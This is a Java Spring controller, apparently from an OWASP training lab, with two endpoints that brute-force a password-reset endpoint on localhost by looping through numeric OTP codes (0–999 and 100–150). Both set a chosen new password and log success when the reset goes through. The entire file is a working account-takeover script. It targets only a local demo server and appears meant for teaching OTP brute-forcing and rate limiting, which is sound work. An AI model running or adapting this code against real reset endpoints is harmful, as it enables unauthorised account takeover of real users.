package com.grid.owasp.owasp;


import lombok.extern.slf4j.Slf4j;
import org.springframework.http.*;
import org.springframework.http.client.support.BasicAuthenticationInterceptor;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;

import java.net.URISyntaxException;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

@Slf4j
@RestController
public class CredentialStuffingController {

    String hostUrl = "http://localhost:8080/";

    @PostMapping("/v1/attack")
    public ResponseEntity<String> bruteForceAttackV1(@RequestParam String userName, @RequestParam String newPassword) {

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

        MultiValueMap<String, String> requestBody = new LinkedMultiValueMap<>();
        requestBody.add("userName", userName);
        requestBody.add("newPassword", newPassword);

        for (int i = 0; i <= 999; i++) {
            try {
                RestTemplate restTemplate = new RestTemplate();
                restTemplate.getInterceptors().add(new BasicAuthenticationInterceptor("user", "pass"));
                String endpoint = hostUrl + "v1/reset-password?";

                HttpEntity<?> request = new HttpEntity<>(requestBody, headers);

                String url = endpoint + "otpCode=" + i;

                ResponseEntity<String> result = restTemplate.postForEntity(url, request, String.class);

                log.info("OtpCode " + i + " is CORRECT!");
                if (result.hasBody() && Objects.requireNonNull(result.getBody()).contains("success")) {
                    log.info("Result: " + result + " ATTACK is successful and password reset for user: " +
                            userName + " with new password: " + newPassword + " with otpCode: " + i);
                    return ResponseEntity.ok("ATTACK is successful and password reset for user: " +
                            userName + " with new password: " + newPassword);
                }
            } catch (Exception e) {
                log.info("OtpCode " + i + " is incorrect");
            }
        }
        return ResponseEntity.ok("ATTACK is not successful for user: " + userName);
    }

    @PostMapping("/v2/attack")
    public ResponseEntity<String> bruteForceAttackV2(@RequestParam String userName, @RequestParam String newPassword) throws URISyntaxException {

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

        MultiValueMap<String, String> requestBody = new LinkedMultiValueMap<>();
        requestBody.add("userName", userName);
        requestBody.add("newPassword", newPassword);

        for (int i = 100; i <= 150; i++) {
            try {
                RestTemplate restTemplate = new RestTemplate();
                restTemplate.getInterceptors().add(new BasicAuthenticationInterceptor("user", "pass"));
                String endpoint = hostUrl + "v2/reset-password?";

                HttpEntity<?> request = new HttpEntity<>(headers);

                String url = endpoint + "otpCode=" + i;
                ResponseEntity<String> result = restTemplate.postForEntity(url, request, String.class);

                log.info("OtpCode " + i + " is CORRECT!");
                if (result.hasBody() && Objects.requireNonNull(result.getBody()).contains("success")) {
                    log.info("Result: " + result + " ATTACK is successful and password reset for user: " +
                            userName + " with new password: " + newPassword + " with otpCode: " + i);
                    return ResponseEntity.ok("ATTACK is successful and password reset for user: " +
                            userName + " with new password: " + newPassword);
                }
            } catch (Exception e) {
                log.info("OtpCode " + i + " is incorrect");
            }
        }
        Map<String, String> errorDetails = new HashMap<>();
        errorDetails.put("ErrorMessage", "ATTACK is not successful for user: " + userName);
        return new ResponseEntity(errorDetails, HttpStatus.TOO_MANY_REQUESTS);
    }

}
